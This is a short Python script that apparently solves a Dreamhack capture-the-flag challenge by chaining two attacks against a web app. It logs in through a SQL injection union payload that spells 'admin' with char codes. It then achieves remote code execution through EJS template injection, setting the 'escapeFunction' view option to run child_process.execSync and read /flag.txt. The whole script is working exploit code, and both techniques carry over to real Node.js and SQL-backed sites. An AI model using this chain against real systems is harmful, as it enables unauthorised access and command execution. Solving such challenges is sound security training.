import requests
from urllib.parse import quote

url = 'http://host3.dreamhack.games:20783/'
s = requests.Session()

# sqli
payload = 'union select char(97,100,109,105,110), 1 --'

res = s.post(f'{url}/user/login', data={
    'id': 'a',
    'pw': 'a',
    'payload': payload
})

assert 'hello' in res.text.lower()
print("> Logged in")

# ejs rce
cmd = 'cat /flag.txt'

payload = '''1; return `${process.mainModule.require('child_process').execSync('%s')}` //''' % cmd

res = s.get(f'{url}/preview?settings[view options][client]=1&settings[view options][escapeFunction]={quote(payload)}', params={
    'title': 'a',
    'content': 'a'
})

print("Flag:", res.text)